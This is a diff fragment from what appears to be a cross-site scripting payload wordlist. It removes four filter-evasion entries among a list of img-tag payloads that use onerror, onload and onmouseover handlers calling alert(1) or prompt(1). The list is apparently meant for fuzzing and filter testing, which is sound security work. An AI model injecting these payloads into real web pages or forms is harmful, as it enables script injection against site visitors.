@@ -572,15 +572,11 @@ http://www.<script>alert(1)</script .com
 <img src=kcf onerror=alert(1)>
 <img src ?kcf?\/onerror = alert(1)
 <img src=# onerror%3D"javascript:alert(1)" >
-`"'><img src="# onerror=alert(1)>
-<--`<img/src=` onerror=alert(1)> --!>
 <img src=/ onerror=alert(1);>
 <img src="" onerror=alert(1)>
 <img src="" onerror=alert(1);>
 <img src=# onerror="alert(1)" >
 "><img src=/ onerror=alert(1);>
-<img src onerror /" '"= alt=alert(1)//">
-<img src onerror /" '"= alt=javascript:alert(1)//">
 <img src="" onload=alert(1)>
 <IMG SRC=# onmouseover="alert('kcf')">
 <img src="/" =_=" title="onerror='prompt(1)'">
